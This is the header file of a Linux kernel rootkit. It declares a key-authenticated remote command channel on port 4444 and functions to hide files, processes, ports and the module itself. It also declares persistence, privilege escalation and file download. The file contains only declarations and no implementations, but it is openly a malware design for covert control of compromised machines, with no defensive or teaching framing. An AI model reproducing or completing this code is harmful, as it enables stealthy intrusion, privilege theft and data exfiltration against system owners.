/* SPDX-License-Identifier: GPL-2.0 */
#ifndef ROOTKIT_H
#define ROOTKIT_H

#include <crypto/hash.h>
#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/kernel.h>
#include <linux/kthread.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/net.h>
#include <linux/sched/task.h>
#include <linux/string.h>
#include <linux/umh.h>
#include <linux/utsname.h>
#include <net/inet_sock.h>
#include <net/net_namespace.h>

#define RK_KEY_LEN	32
#define RK_KEY_HEX_LEN	64
#define RK_FP_LEN	4
#define RK_PORT		4444
#define RK_BUF_MAX	512
#define RK_REPLY(sock, str) rk_send((sock), (str), sizeof(str) - 1)
#define RK_MAX_TARGETS	16
#define RK_TARGET_LEN	64

/* core/init.c */
extern u8 rk_key[RK_KEY_LEN];
extern u8 rk_fingerprint[RK_FP_LEN];
extern struct task_struct *rk_thread;
extern struct socket *rk_listen_sock;

/* core/target.c */
extern char hidden_files[RK_MAX_TARGETS][RK_TARGET_LEN];
extern int file_count;
extern char hidden_pids[RK_MAX_TARGETS][RK_TARGET_LEN];
extern int pid_count;
extern char hidden_contents[RK_MAX_TARGETS][RK_TARGET_LEN];
extern int content_count;
extern unsigned short hidden_ports[RK_MAX_TARGETS];
extern int port_count;

int rk_target_add(char targets[][RK_TARGET_LEN], int *count,
		  const char *value);
int rk_target_remove_at(char targets[][RK_TARGET_LEN], int *count, int idx);
int rk_target_remove(char targets[][RK_TARGET_LEN], int *count,
		     const char *value);
int rk_port_add(unsigned short port);
void rk_port_remove_at(int idx);
int rk_port_remove(unsigned short port);

/* core/opsec.c */
extern int auto_pid_index;
extern int auto_port_index;
extern struct list_head *saved_prev;
extern bool module_hidden;
extern bool persist_active;

void rk_auto_hide(struct socket *client);
void rk_auto_unhide(void);
int rk_cmd_hide_module(struct socket *client);
int rk_cmd_unhide_module(struct socket *client);
int rk_cmd_persist(struct socket *client);
int rk_cmd_unpersist(struct socket *client);

/* network/protocol.c */
int rk_send(struct socket *sock, const void *buf, size_t len);
int rk_recv(struct socket *sock, void *buf, size_t len);
int rk_compute_fingerprint(const u8 *key, size_t key_len,
			   u8 *fp, size_t fp_len);

/* network/agent.c */
int rk_agent_thread(void *data);

/* execution/commands.c */
int rk_cmd_hide_target(struct socket *client,
		       char targets[][RK_TARGET_LEN],
		       int *count, const char *value);
int rk_cmd_unhide_target(struct socket *client,
			 char targets[][RK_TARGET_LEN],
			 int *count, const char *value);
int rk_cmd_hide_port(struct socket *client, const char *arg);
int rk_cmd_unhide_port(struct socket *client, const char *arg);
int rk_cmd_info(struct socket *client);
int rk_cmd_status(struct socket *client);
int rk_cmd_list(struct socket *client, const char *category);
int rk_cmd_unhide_all(struct socket *client);
int rk_cmd_escalate(struct socket *client);
int rk_cmd_download(struct socket *client, const char *path);

/* execution/dispatch.c */
int rk_dispatch(struct socket *client, char *cmd);

#endif /* ROOTKIT_H */
